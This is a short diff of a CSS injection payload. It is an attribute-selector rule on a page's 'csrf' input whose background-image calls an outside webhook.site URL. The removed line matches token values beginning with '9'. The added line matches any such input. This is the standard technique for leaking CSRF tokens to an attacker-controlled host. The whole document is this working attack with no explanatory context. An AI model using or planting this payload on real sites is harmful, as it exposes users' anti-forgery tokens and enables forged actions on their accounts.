@@ -1,3 +1,3 @@
-input[name=csrf][value^=9]{
+input[name=csrf]{
     background-image: url(https://webhook.site/2ae8816b-2f2c-4ed1-986c-01c6f86aeed2/?);   
 }
